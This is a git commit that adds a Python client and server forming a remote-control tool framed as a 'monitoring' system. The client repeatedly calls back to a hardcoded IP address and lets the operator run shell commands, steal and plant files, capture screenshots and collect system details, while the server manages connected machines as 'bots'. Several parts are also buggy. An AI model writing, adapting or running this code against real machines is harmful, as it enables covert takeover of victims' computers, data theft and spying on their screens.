be46b7c9e06b372c6e7f5cf014c757eba46046c0
NEIL TYAGI <tyagi.neil@hotmail.com>
2020-01-13 17:59:33 +0530

    Add files via upload

---
+++ client.py
@@ -0,0 +1,191 @@
+#!/usr/bin/python3
+import socket
+import subprocess
+import os
+import time
+import platform
+#from PIL import ImageGrab
+import tempfile
+import shutil
+import psutil
+from datetime import datetime
+
+
+
+
+
+IPADDRESS="EDIT YOUR IP HERE WITHIN THE QUOTES"
+PORT=8080 #DEFAULT
+
+
+
+global s
+
+
+def connect():
+    global s
+    while True:
+
+        x=5
+        try:
+            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            s.connect(('192.168.10.155',8080))
+            x=0
+
+        except:
+            time.sleep(5)
+
+        if x == 0 :
+            break
+
+
+
+def transferupload(s,command):
+    upload,fname=command.split('*')
+    path=os.getcwd()+"/"
+    path += fname
+    f=open(path,'wb+')
+    bits=s.recv(1024)
+    while True:
+        f.write(bits)
+
+        if bits.endswith('DONE'):
+            f.close()
+            break
+        bits=s.recv(1024)
+
+ 
+def transfergrab(s,path):
+	if os.path.exists(path):
+		f=open(path,'rb')
+		f.seek(0)
+		packet=f.read(1024)
+		while packet!='':
+			s.send(packet.encode())
+			packet=f.read(1024)
+			s.send(("DONE").encode())
+		f.close()
+	else:
+		msg="The File Doesn't Exist"
+		s.send(msg.encode())
+
+
+        
+        
+def screenshot(s):
+    
+    dirpath=tempfile.mkdtemp()
+    ImageGrab.grab().save(dirpath + "/img.jpg","JPEG")
+    path=dirpath + "/img.jpg"
+    f=open(path,'rb')
+    f.seek(0)
+    packet=f.read(1024)
+    while packet!='':
+        s.send(packet)
+        packet=f.read(1024)
+    s.send("DONE")
+    f.close()
+    
+    shutil.rmtree(dirpath)
+    
+
+def get_size(bytes, suffix="B"):
+    """
+    Scale bytes to its proper format
+    e.g:
+        1253656 => '1.20MB'
+        1253656678 => '1.17GB'
+    """
+    factor = 1024
+    for unit in ["", "K", "M", "G", "T", "P"]:
+        if bytes < factor:
+            return f"{bytes:.2f}{unit}{suffix}"
+        bytes /= factor
+
+
+
+
+def connection():
+	
+	global s
+
+	while True:
+        
+		command=s.recv(1024)
+		command=command.decode()
+            
+        
+                
+		if 'grab' in command:
+			grab,path=command.split('*')
+			try:
+				transfergrab(s,path)
+			except e:
+                		s.send(e.encode())
+                		pass
+        
+		elif 'upload' in command:
+			transferupload(s,command)
+
+        
+		elif 'cd' in command:
+			code,directory = command.split ('*') 
+			os.chdir(directory) 
+			s.send(("[+] CWD Is " + os.getcwd()).encode())
+			s.send(("DONE").encode())
+       
+                            
+		elif 'shell' in command:
+			shell,query = command.split('*')
+			query=query.split()
+			try:
+				cmd=subprocess.Popen(query,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+				stdout,stderr=cmd.communicate()
+				if stdout:
+					s.send(stdout)
+					s.send(("DONE").encode())
+				elif stderr:
+					s.send(stderr)
+					s.send(("DONE").encode())
+			except:
+				s.send("COMMAND_NOT_FOUND".encode())
+
+		elif 'screenshot' in command:
+			screenshot(s)
+
+
+		elif 'SLEEP' in command: 
+			s.close()
+			time.sleep(16)
+			break
+
+		elif 'os' in command:
+			uname=platform.uname()
+			a=uname.system+"$"+uname.node+"$"+uname.machine+"$"+uname.version
+			s.send(a.encode())
+
+		elif 'status' in command:
+			uname=platform.uname()
+			boot_time_timestamp = psutil.boot_time()
+			bt = datetime.fromtimestamp(boot_time_timestamp)
+			svmem = psutil.virtual_memory()
+			swap = psutil.swap_memory()
+			cpufreq = psutil.cpu_freq()
+			bootdate=str(bt.year)+"-"+str(bt.month)+"-"+str(bt.day)
+			boottime=str(bt.hour)+":"+str(bt.minute)+":"+str(bt.second)
+			tm=str(get_size(svmem.total))
+			am=str(get_size(svmem.available))
+			um=str(get_size(svmem.used))
+			perm=str(svmem.percent)+"%"
+			ts=str(get_size(swap.total))
+			fs=str(get_size(swap.free))
+			cpuf=str(cpufreq.current)+"Mhz"
+			tcpu=str(psutil.cpu_percent())+"%"
+			data=uname.system+"$"+uname.node+"$"+uname.machine+"$"+uname.version+"$"+bootdate+"$"+boottime+"$"+tm+"$"+am+"$"+um+"$"+perm+"$"+ts+"$"+fs+"$"+cpuf+"$"+tcpu
+			s.send(data.encode())
+
+
+while True:
+	global s
+	connect()
+	connection()
---
+++ server.py
@@ -0,0 +1,447 @@
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+import socket
+import os
+from threading import Thread
+from prettytable import PrettyTable
+from colorama import Fore, Style
+import time
+import sys
+
+
+
+
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+if len(sys.argv) != 3:
+    print ("Correct usage: script <IP address> <port number>")
+    exit()
+
+IP_address = str(sys.argv[1])
+Port = int(sys.argv[2])
+
+server.bind((IP_address, Port))
+server.listen(50)
+
+
+
+list_of_clientsocket = []
+list_of_clientaddr = []
+
+flag=True
+
+imageno=1
+bottable = PrettyTable(['INDEX','IP','PORT','OS','HOSTNAME','ARCH','VERSION'])
+
+
+
+def session(conn):
+
+	print ("\n \n")
+	print ("==========================")
+	print ("CONNECTED TO THE CLIENT")
+	print ("==========================") 
+	print (Fore.YELLOW)
+	print ("PRESS HELP FOR INSTRUCTIONS")
+	print (Style.RESET_ALL)
+	print ("\n")
+
+	while True:
+		command=input("bot>")
+		if 'exit' in command:
+			print ("\n BACK TO MOTHERSHIP \n")
+			return
+
+		elif 'grab*' in command:
+			try:
+				transfergrab(conn,command)
+			except:
+				conn.close()
+				remove(conn)
+				return
+
+		elif 'upload*' in command:
+			try:
+				transferupload(conn,command)
+			except:
+				conn.close()
+				remove(conn)
+				return
+		elif 'cd*' in command:
+			try:
+				conn.send(command)
+				shell=conn.recv(1024)
+				while True:
+					print (shell)
+					if shell.endswith("DONE"):
+						break
+					shell=conn.recv(1024)
+			except:
+				conn.close()
+				remove(conn)
+				return
+
+		elif 'screenshot' in command:
+			try:
+				screenshot(conn,command)
+			except:
+				conn.close()
+				remove(conn)
+				return
+		elif 'shell*' in command:
+			try:
+				conn.send(command.encode())
+				shell=conn.recv(1024).decode()
+				if shell.startswith("COMMAND_NOT_FOUND"):
+					print("command not found")
+				else:
+					while True:
+						print (shell)
+						if shell.endswith("DONE"):
+							break
+						shell=conn.recv(1024).decode()
+			except:
+				conn.close()
+				remove(conn)
+				return
+		elif 'help' in command:
+			helpbot()
+		elif 'status' in command:
+			clientstatus(conn,command)
+		else:
+			print("INVALID COMMAND PRESS HELP FOR MORE INFO")
+
+
+
+
+def remove(connection):
+    
+    if connection in list_of_clientsocket:
+        x=list_of_clientsocket.index(connection)
+        list_of_clientsocket.pop(x)
+        print(Fore.RED)
+        print ("[-] client disconnected " + list_of_clientaddr[x][0] + "\n")
+        print(Style.RESET_ALL)
+        list_of_clientaddr.pop(x)
+
+
+
+
+def mothership():
+    global flag
+    while True:
+        command=input("<mothership>")
+      
+
+        if 'showbots' in command:
+            x=showbots()
+            while x != 0:
+                x=showbots()
+
+
+        elif "connect" in command:
+            a,b=command.split(" ")
+            b=int(b)
+            if b<len(list_of_clientaddr):
+                session(list_of_clientsocket[b])
+            else:
+                print(Fore.RED)
+                print("[-]index out of range TRY AGAIN (indexing starts from 0)")
+                print(Style.RESET_ALL)
+
+        elif "exit" in command:
+
+            quitsafely()
+        elif "help" in command:
+            helpmothership()
+
+        else:
+            print("INVALID COMMAND PRESS HELP FOR MORE INFO")
+
+def showbots():
+
+	bottable.clear_rows()
+	for x in range(len(list_of_clientsocket)):
+		try:
+			list_of_clientsocket[x].send('os'.encode())
+			clientinfo=list_of_clientsocket[x].recv(1024)
+			if clientinfo=='':
+				return 1
+			clientinfo=clientinfo.decode()
+			clientinfo=clientinfo.split('$')
+		except:
+			list_of_clientsocket[x].close()
+			remove(list_of_clientsocket[x])
+			return 1
+		table=[x,list_of_clientaddr[x][0],list_of_clientaddr[x][1]]
+		table.extend(clientinfo)
+		bottable.add_row(table)
+
+	print ("CURRENTLY CONNECTED BOTS")
+	print ("----------------------------")    
+	print (bottable)
+	return 0
+
+
+def clientstatus(conn,command):
+	conn.send(command.encode())
+	data=conn.recv(1024)
+	data=data.decode()
+	data=data.split('$')
+	osdetailslist=data[0:6]
+	memorylist=data[6:10]
+	swaplist=data[10:12]
+	cpulist=data[12:14]
+	osdetailstable = PrettyTable(['Os','Hostname','Arch','Version','Boot Date','Boot Time'])
+	memorytable = PrettyTable(['Total Memory','Available Memory','Used Memory','Percent Use'])
+	swaptable = PrettyTable(['Total Swap','Free Swap'])
+	cputable = PrettyTable(['Current Clock Speed','CPU %'])
+
+	osdetailstable.add_row(osdetailslist)
+	memorytable.add_row(memorylist)
+	swaptable.add_row(swaplist)
+	cputable.add_row(cpulist)
+
+	print("OS DETAILS")
+	print(osdetailstable)
+	print("MEMORY STATUS")
+	print(memorytable)
+	print("SWAP STATUS")
+	print(swaptable)
+	print("CPU STATUS")
+	print(cputable)
+
+
+def botconnect():
+ 
+    global flag
+    while flag:
+         
+        conn, addr = server.accept()
+        list_of_clientsocket.append(conn)
+        list_of_clientaddr.append(addr)
+        if flag==True:
+            print(Fore.GREEN)
+            print("\n [+] incoming connection " + addr[0] + " connected")       
+            print(Style.RESET_ALL)
+       
+        
+          
+
+def screenshot(conn,command):
+    global imageno
+    conn.send(command)
+    
+    filename="screenshot"+str(imageno)+".jpg"
+    path=os.getcwd()+"/"
+    path += filename
+    
+    f=open(path,'wb+')
+    while True:
+        bits=conn.recv(1024)
+        f.write(bits)
+                
+        if bits.endswith('DONE'):
+            
+            print(Fore.GREEN)
+            print("[+]screenshot saved at "+ path)   
+            print(Style.RESET_ALL)
+       
+            
+            f.close()
+            break
+    
+    imageno+=1
+
+def transfergrab(conn,command):
+    
+    conn.send(command)
+    grab,filename=command.split('*')
+    path=os.getcwd()+"/"
+    path += filename
+    
+    bits=conn.recv(1024)
+    if "The File Doesn't Exist" in bits:
+        
+        print(Fore.RED)
+        print("[-]The File Doesn't Exist")   
+        print(Style.RESET_ALL)
+            
+    else:
+        f=open(path,'wb+')
+        while True:
+            f.write(bits)
+                
+            if bits.endswith('DONE'):
+                print(Fore.GREEN)
+                print("[+]File Transfer Complete")   
+                print(Style.RESET_ALL)
+                
+                f.close()
+                break
+            bits=conn.recv(1024)            
+            
+
+            
+def transferupload(conn,command):
+    print(Fore.YELLOW)
+    print("[+] YOU HAVE INVOKED THE UPLOAD COMMAND")
+    print("[+] THE FILE MUST BE IN YOUR CURRENT WORKING DIRECTORY")
+    print(Style.RESET_ALL)
+    upload,fname=command.split('*')
+    if os.path.exists(fname):
+        
+        conn.send(command)
+        print(Fore.BLUE)
+        print("[+]UPLOADING")
+        print(Style.RESET_ALL)
+        
+        f=open(fname,'rb')
+        f.seek(0)
+        packet=f.read(1024)
+        while packet!='':
+            conn.send(packet)
+            packet=f.read(1024)
+        conn.send("DONE")
+        f.close()
+        print(Fore.GREEN)
+        print("[+]UPLOAD SUCCESSFULL")
+        print(Style.RESET_ALL)
+    else:
+        print(Fore.RED)
+        print("[-]The File Doesn't Exist")
+        print(Style.RESET_ALL)
+        
+        
+        
+def quitsafely():
+    global flag
+    ans=input("\n ARE YOU SURE?(Y/N) ")
+    if ans=='y' or ans=='Y':
+        flag = False
+        
+        for conn in list_of_clientsocket:
+            
+            
+            conn.send("SLEEP".encode())
+            x=list_of_clientsocket.index(conn)
+            print ("going to sleep "+list_of_clientaddr[x][0] )
+            conn.close()
+                
+        print(Fore.GREEN)
+        print("\n --------------------------------------------------------------------------")
+        print("ALL BOTS ARE SLEEPING IT IS SAFE TO QUIT/EXIT NOW.")
+        print("EXITING IN 10 SECONDS")
+        print(" --------------------------------------------------------------------------")
+        print(Style.RESET_ALL)
+        
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect((str(sys.argv[1]),int(sys.argv[2])))
+        
+        print(Fore.RED)
+        for remaining in range(10, 0, -1):
+            sys.stdout.write("\r")
+            sys.stdout.write("{:2d} seconds remaining.".format(remaining)) 
+            sys.stdout.flush()
+            time.sleep(1)
+        print(Style.RESET_ALL)
+        
+        
+        
+        
+        exit()
+        sys.exit()
+            
+        
+     
+    else:
+        return
+        
+        
+        
+        
+        
+
+def graphics():
+
+
+	print("\n\n\n")
+	print(Fore.GREEN)
+	print('''		 ██████╗███╗   ███╗ ██████╗███████╗
+		██╔════╝████╗ ████║██╔════╝██╔════╝
+		██║     ██╔████╔██║██║     ███████╗
+		██║     ██║╚██╔╝██║██║     ╚════██║
+		╚██████╗██║ ╚═╝ ██║╚██████╗███████║
+	 	╚═════╝╚═╝     ╚═╝ ╚═════╝╚══════╝
+     		Centralised Monitoring And Control System
+     		A framework Purely in Python''')
+	print(Fore.YELLOW)
+	print('''   	  ___   _      ___   _      ___   _      ___   _      ___   _
+	 [(_)] |=|    [(_)] |=|    [(_)] |=|    [(_)] |=|    [(_)] |=|
+	  '-`  |_|     '-`  |_|     '-`  |_|     '-`  |_|     '-`  |_|
+	 /mmm/  /     /mmm/  /     /mmm/  /     /mmm/  /     /mmm/  /
+	       |____________|____________|____________|____________|
+	                             |            |            |
+	                         ___  \_      ___  \_      ___  \_
+	                        [(_)] |=|    [(_)] |=|    [(_)] |=|
+	                         '-`  |_|     '-`  |_|     '-`  |_|
+	                        /mmm/        /mmm/        /mmm/''')
+	print("		Enter Help For Instructions")
+	print(Style.RESET_ALL)
+	print("\n \n \n  ")
+def helpmothership():
+    
+    
+    print("+----------------+--------------------------------------+")
+    print("|     COMMAND    | DESCRIPTION                          |")
+    print("+----------------+--------------------------------------+")
+    print("| showbots       | display table of connected bots      |")
+    print("+----------------+--------------------------------------+")
+    print("| connect <index>| connect to bot at a specified index  |")
+    print("+----------------+--------------------------------------+")
+    print("| exit           |exit the application(bots go to sleep)|")
+    print("+----------------+--------------------------------------+")
+    print("| help           | see this table                       |")
+    print("+----------------+--------------------------------------+")  
+    print("\n")
+
+def helpbot():
+    
+    print("+-------------------+--------------------------------------------------------+")
+    print("|      COMMAND      | DESCRIPTION                                            |")
+    print("+-------------------+--------------------------------------------------------+")
+    print("|        exit       | back to mothership(stay connected to the bot)          |")
+    print("+-------------------+--------------------------------------------------------+")
+    print("|        help       | see this table                                         |")
+    print("+-------------------+--------------------------------------------------------+")
+    print("|     screenshot    | take a screenshot of bot and save to cwd of mothership |")
+    print("+-------------------+--------------------------------------------------------+")
+    print("|  shell*<command>  | execute a shell command on bot                         |")
+    print("+-------------------+--------------------------------------------------------+")
+    print("|  grab*<file_name> | transfer a file from cwd of bot to cwd of mothership   |")
+    print("+-------------------+--------------------------------------------------------+")
+    print("| upload*<filename> | transfer a file from cwd of mothership to cwd of bot   |")
+    print("+-------------------+--------------------------------------------------------+")
+    print("|     cd*<path>     | change cwd of bot                                      |")
+    print("+-------------------+--------------------------------------------------------+")
+    
+    
+
+
+
+
+
+
+
+t1 = Thread(target = botconnect)
+
+graphics()
+t1.start()
+mothership()
+
+
+
+
+
+
